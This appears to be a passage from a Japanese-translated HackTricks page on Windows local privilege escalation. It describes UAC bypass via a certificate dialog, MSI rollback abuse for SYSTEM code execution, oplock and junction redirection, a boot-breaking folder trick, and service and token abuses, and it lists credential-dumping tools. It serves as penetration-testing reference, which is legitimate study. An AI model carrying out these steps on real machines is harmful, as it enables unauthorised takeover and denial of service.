グラフィカルインターフェース（console または RDP 経由）にアクセスでき、UAC が有効になっている場合、いくつかの Microsoft Windows のバージョンでは、特権のないユーザーから "NT\AUTHORITY SYSTEM" のようなターミナルやその他のプロセスを実行することが可能です。

これにより、同じ脆弱性を利用して権限昇格と UAC バイパスを同時に行うことができます。さらに、何もインストールする必要はなく、プロセス中に使用されるバイナリは Microsoft によって署名・発行されています。

Some of the affected systems are the following:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
この脆弱性を悪用するには、次の手順を実行する必要があります:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

The attack basically consist of abusing the Windows Installer's rollback feature to replace legitimate files with malicious ones during the uninstallation process. For this the attacker needs to create a **malicious MSI installer** that will be used to hijack the `C:\Config.Msi` folder, which will later be used by he Windows Installer to store rollback files during the uninstallation of other MSI packages where the rollback files would have been modified to contain the malicious payload.

この攻撃は基本的に Windows Installer の rollback 機能を悪用し、アンインストール中に正規ファイルを悪意あるファイルに置き換えるものです。そのために攻撃者は `C:\Config.Msi` フォルダをハイジャックするための **悪意のある MSI インストーラ** を作成する必要があります。Windows Installer は他の MSI パッケージのアンインストール時に rollback ファイルをこのフォルダに保存するため、これらの rollback ファイルを改変してペイロードを含めます。

The summarized technique is the following:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

1. ステージ1の要約 — ハイジャックの準備（`C:\Config.Msi` を空にしておく）

- ステップ 1: MSI のインストール
  - 書き込み可能なフォルダ (`TARGETDIR`) に無害なファイル（例：`dummy.txt`）をインストールする `.msi` を作成します。
  - インストーラを **"UAC Compliant"** としてマークし、**非管理者ユーザ** が実行できるようにします。
  - インストール後、そのファイルへの **ハンドル** を開いたままにします。

- ステップ 2: アンインストール開始
  - 同じ `.msi` をアンインストールします。
  - アンインストール処理はファイルを `C:\Config.Msi` に移動し、`.rbf`（rollback バックアップ）にリネームし始めます。
  - `GetFinalPathNameByHandle` を使って開いているファイルハンドルをポーリングし、ファイルが `C:\Config.Msi\<random>.rbf` になったことを検出します。

- ステップ 3: カスタム同期
  - `.msi` には **カスタムアンインストールアクション (`SyncOnRbfWritten`)** が含まれており、
    - `.rbf` が書き込まれたことをシグナルします。
    - その後、アンインストールを続行する前に別のイベントで **待機** します。

- ステップ 4: `.rbf` の削除をブロック
  - シグナルを受けたら、`FILE_SHARE_DELETE` なしで **`.rbf` ファイルを開く** — これにより **削除を防ぎます**。
  - その後、アンインストールを終了させるために **シグナルを返します**。
  - Windows Installer は `.rbf` を削除できず、すべての内容を削除できないため **`C:\Config.Msi` は削除されません**。

- ステップ 5: `.rbf` を手動で削除
  - 攻撃者は `.rbf` ファイルを手動で削除します。
  - これで **`C:\Config.Msi` は空になり**、ハイジャックの準備が整います。

> この時点で、**SYSTEM レベルの任意フォルダ削除脆弱性** をトリガーして `C:\Config.Msi` を削除します。

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- **Boom**: Your code is executed **as SYSTEM**.

2. ステージ2 — rollback スクリプトを悪意あるものに置き換える

- ステップ 6: 弱い ACL で `C:\Config.Msi` を再作成
  - 自分で `C:\Config.Msi` フォルダを再作成します。
  - 弱い DACL（例: Everyone:F）を設定し、`WRITE_DAC` でハンドルを開いたままにします。

- ステップ 7: 再度インストールを実行
  - `.msi` を再度インストールします。設定は次の通り：
    - `TARGETDIR`: 書き込み可能な場所
    - `ERROROUT`: 強制失敗を引き起こす変数
  - このインストールは再び **rollback** をトリガーするために使われ、`.rbs` と `.rbf` を読み込みます。

- ステップ 8: `.rbs` を監視
  - `ReadDirectoryChangesW` を使って `C:\Config.Msi` を監視し、新しい `.rbs` が現れるまで待ちます。
  - そのファイル名を取得します。

- ステップ 9: rollback 前の同期
  - `.msi` には **カスタムインストールアクション (`SyncBeforeRollback`)** が含まれており、
    - `.rbs` が作成されたときにイベントをシグナルします。
    - その後、続行する前に **待機** します。

- ステップ 10: 弱い ACL を再適用
  - `.rbs created` イベントを受け取った後、
    - Windows Installer は `C:\Config.Msi` に強い ACL を再適用します。
    - しかし、あなたが `WRITE_DAC` を持ったハンドルを保持しているため、再び弱い ACL を **再適用** できます。

> ACL は **ハンドルを開いた時点でのみ強制される** ため、依然としてフォルダへの書き込みが可能です。

- ステップ 11: 偽の `.rbs` と `.rbf` を置く
  - `.rbs` ファイルを上書きして、Windows に次を指示する **偽の rollback スクリプト** を配置します：
    - あなたの `.rbf` ファイル（悪意のある DLL）を権限の高い場所（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）に復元する。
    - 悪意のある SYSTEM レベルのペイロード DLL を含む偽の `.rbf` を配置する。

- ステップ 12: rollback をトリガー
  - 同期イベントをシグナルしてインストーラを再開させます。
  - 既知の地点でインストールを **意図的に失敗させる** 設定（**type 19 custom action (`ErrorOut`)**）があります。
  - これにより **rollback が開始** されます。

- ステップ 13: SYSTEM があなたの DLL をインストール
  - Windows Installer はあなたの悪意ある `.rbs` を読み込み、
  - `.rbf` の DLL をターゲットの場所にコピーします。
  - これで **SYSTEM によってロードされるパスに悪意ある DLL が配置されます**。

- 最終ステップ: SYSTEM コードを実行
  - あなたがハイジャックした DLL をロードする、信頼された **auto-elevated バイナリ**（例: `osk.exe`）を実行します。
  - **Boom**：あなたのコードが **SYSTEM として実行されます**。


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

The main MSI rollback technique (the previous one) assumes you can delete an **entire folder** (e.g., `C:\Config.Msi`). But what if your vulnerability only allows **arbitrary file deletion** ?

You could exploit **NTFS internals**: every folder has a hidden alternate data stream called:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
このストリームはフォルダの**インデックスメタデータ**を格納します。

したがって、フォルダの`::$INDEX_ALLOCATION`ストリームを**削除すると**、NTFSはファイルシステムから**フォルダ全体を削除します**。

これを実行するには、次のような標準のファイル削除APIを使用できます：
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> あなたが*file* delete APIを呼び出しているにもかかわらず、**folder自体が削除されます**。

### フォルダの内容の削除から SYSTEM EoP へ
あなたのprimitiveが任意のファイル/フォルダを削除できないが、**攻撃者が制御するフォルダの*contents*の削除を許す**場合はどうしますか？

1. Step 1: おとりフォルダとファイルをセットアップ
- 作成: `C:\temp\folder1`
- その中に: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を設置する
- そのoplockは、特権プロセスが `file1.txt` を削除しようとすると**実行を一時停止させます**。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. ステップ 3: SYSTEM プロセスをトリガーする（例: `SilentCleanup`）
- このプロセスはフォルダ（例: `%TEMP%`）をスキャンし、その内容を削除しようとします。
- `file1.txt` に到達すると、**oplock が発動**し、コントロールをあなたの callback に渡します。

4. ステップ 4: oplock callback 内で — 削除をリダイレクトする

- オプション A: `file1.txt` を別の場所に移動する
- これにより oplock を壊さずに `folder1` を空にできます。
- `file1.txt` を直接削除しないでください — それをすると oplock が早期に解除されます。

- オプション B: `folder1` を **junction** に変換する:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- オプション C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> これは NTFS のフォルダメタデータを格納する内部ストリームを狙っています — それを削除するとフォルダ自体が削除されます。

5. Step 5: oplock を解除
- SYSTEM プロセスは続行し、`file1.txt` を削除しようとします。
- しかし今は junction + symlink のため、実際に削除しているのは:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Result**: `C:\Config.Msi` は SYSTEM によって削除される。

### Arbitrary Folder Create から Permanent DoS へ

ファイルを書き込めない、または弱い権限を設定できない場合でも、**create an arbitrary folder as SYSTEM/admin** を可能にするプリミティブを悪用します。

**critical Windows driver** の名前で **folder**（ファイルではなく）を作成します。例：
```
C:\Windows\System32\cng.sys
```
- このパスは通常 `cng.sys` カーネルモードドライバに対応します。
- もしそれを**フォルダとして事前に作成しておく**と、Windows は起動時に実際のドライバを読み込めません。
- その後、Windows は起動中に `cng.sys` を読み込もうとします。
- フォルダを検出し、**実際のドライバを解決できず**、そして**クラッシュするか起動が停止します**。
- 外部からの介入（例：ブート修復やディスクアクセス）がない限り、**フォールバックはなく**、**復旧もできません**。


## **High Integrity から System へ**

### **新しいサービス**

もし既に High Integrity プロセスで実行中であれば、**SYSTEM へのパス**は**新しいサービスを作成して実行するだけ**で簡単に取得できます：
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> サービス用バイナリを作成する際は、それが有効なサービスであること、またはバイナリが必要な処理を速やかに実行することを確認してください。無効なサービスである場合、20秒で強制終了されます。

### AlwaysInstallElevated

High Integrity プロセスから、**AlwaysInstallElevated のレジストリ エントリを有効に**し、_**.msi**_ ラッパーを使ってリバースシェルを**インストール**することができます。\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**参照できます** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

これらのトークン権限を持っている場合（おそらく既に High Integrity のプロセス内で見つかるでしょう）、SeDebug 権限でほとんどのプロセス（protected process は除く）を**開き**、プロセスの**トークンをコピー**し、そのトークンで**任意のプロセスを作成**することができます。\
この手法では通常、すべてのトークン権限を持つ SYSTEM として動作しているプロセスを**選択します**（_はい、すべてのトークン権限を持たない SYSTEM プロセスも存在します_）。\
**例のコードは** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**で確認できます。**

### **Named Pipes**

この手法は meterpreter が `getsystem` を行う際に使います。手法は、**パイプを作成し、サービスを作成／悪用してそのパイプに書き込ませる**ことにあります。すると、**パイプを作成したサーバー**は **`SeImpersonate`** 権限を使ってパイプクライアント（サービス）の**トークンを偽装（impersonate）**でき、SYSTEM 権限を取得できます。\
[**learn more about name pipes you should read this**](#named-pipe-client-impersonation) を読むと Named Pipes について詳しくなれます。\
High Integrity から System へ移行する例を読みたい場合は、[**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md) を参照してください。

### Dll Hijacking

もし **SYSTEM として動作するプロセス**に読み込まれる dll を**ハイジャック**できれば、その権限で任意コードを実行できます。したがって Dll Hijacking はこの種の権限昇格にも有用であり、さらに High Integrity プロセスから達成する方が**はるかに簡単**です。High Integrity プロセスは dll をロードするフォルダに対して**書き込み権限**を持つ可能性が高いからです。\
**詳細は** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**を参照してください。**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## 追加情報

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## 便利なツール

**Windows のローカル権限昇格ベクターを探す最良のツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 設定ミスや機密ファイルをチェックします（**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。検出済み。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- いくつかの可能な設定ミスをチェックし情報収集を行います（**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 設定ミスをチェックします。**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、RDP の保存セッション情報を抽出します。ローカルでは -Thorough を使用してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager から資格情報を抽出します。検出済み。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集したパスワードをドメインに対してスプレーします。**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- PowerShell ベースの ADIDNS/LLMNR/mDNS/NBNS スプーファー兼中間者ツールです。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的な Windows の権限昇格調査用列挙スクリプト。**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**\~\~ -- 既知の権限昇格脆弱性を検索します（Watson に置換され非推奨）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- ローカルチェック **(管理者権限が必要)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の権限昇格脆弱性を検索します（VisualStudio でのコンパイルが必要）([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- ホストを列挙して設定ミスを検索します（権限昇格というより情報収集ツール）。（コンパイルが必要）**（**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**）**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多くのソフトウェアから資格情報を抽出します（GitHub に事前コンパイル済みの exe あり）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp を C# に移植したもの**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**\~\~ -- 設定ミスをチェックします（GitHub に事前コンパイル済みの実行ファイルあり）。推奨しません。Win10 ではうまく動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 設定ミスの可能性をチェックします（python から exe を生成）。推奨しません。Win10 ではうまく動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- 本投稿に基づいて作成されたツールです（accesschk がなくても動作しますが、使用可能です）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** の出力を読み取り、動作するエクスプロイトを推奨します（ローカル python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** の出力を読み取り、動作するエクスプロイトを推奨します（ローカル python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

プロジェクトは正しいバージョンの .NET を使ってコンパイルする必要があります（[see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。被害者ホストにインストールされている .NET のバージョンを確認するには、次のようにできます：
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考文献

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
